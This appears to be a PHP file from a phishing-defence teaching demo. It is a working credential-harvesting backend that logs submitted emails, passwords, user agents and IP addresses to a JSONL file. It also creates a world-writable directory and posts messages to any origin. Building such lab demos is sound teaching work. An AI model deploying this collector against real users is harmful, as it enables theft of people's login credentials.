<?php
// D_collect.php — Teaching-only credential collector (for defense demo)
// In a real system this must never be deployed. It only demonstrates
// how an attacker could log stolen data, and how a defense can block reuse.

header('Content-Type: text/html; charset=utf-8');

// Default storage path: ../Data/phished.jsonl (relative to this file)
$path = __DIR__ . '/../Data/phished.jsonl';
$dir  = dirname($path);
if (!is_dir($dir)) { @mkdir($dir, 0777, true); }

/* ====== NEW: clear file on demand (used by logout/reset) ====== */
$wantClear = isset($_REQUEST['clear']) && (string)$_REQUEST['clear'] !== '0';
if ($wantClear) {
  // Truncate the file safely (create if not exists)
  $ok = @file_put_contents($path, '', LOCK_EX) !== false;
  echo '<!doctype html><meta charset="utf-8"><title>cleared</title>';
  echo $ok ? 'cleared' : 'clear-failed';
  // Notify parent panel (iframes) to refresh credentials table
  echo '<script>
    try{ window.parent && window.parent.postMessage({ type:"CREDENTIALS_CLEARED" }, "*"); }catch(e){}
  </script>';
  exit;
}
/* ============================================================= */

// Build one record from POST data
$rec = [
  'ts'       => gmdate('c'),   // Timestamp in ISO 8601 (UTC)
  'email'    => isset($_POST['email']) ? trim($_POST['email']) : '',
  'password' => isset($_POST['password']) ? (string)$_POST['password'] : '',
  'ua'       => $_SERVER['HTTP_USER_AGENT'] ?? '', // Browser user agent
  'ip'       => $_SERVER['REMOTE_ADDR'] ?? '',     // Client IP address
  'track'    => 'defense-demo',                    // Tag for this demo context
];

// Optional teaching flag: if panel posts blocked=1, keep a minimal marker
$blocked = isset($_POST['blocked']) && (string)$_POST['blocked'] !== '0';
if ($blocked) {
  $rec['password'] = '';          // don’t store any password
  $rec['track']     = 'defense-demo (blocked)';
}

// Append the JSON record as a single line (JSON Lines format)
$ok = @file_put_contents(
  $path,
  json_encode($rec, JSON_UNESCAPED_UNICODE) . PHP_EOL,
  FILE_APPEND | LOCK_EX
);

// Simple feedback page (teaching only)
echo '<!doctype html><meta charset="utf-8"><title>ok</title>';
echo $ok ? 'ok' : 'fail';

// Notify the parent panel (if embedded in an iframe) to refresh its log view.
echo '<script>
try {
  window.parent && window.parent.postMessage({ type: "CREDENTIALS_CAPTURED" }, "*");
} catch (e) {}
</script>';
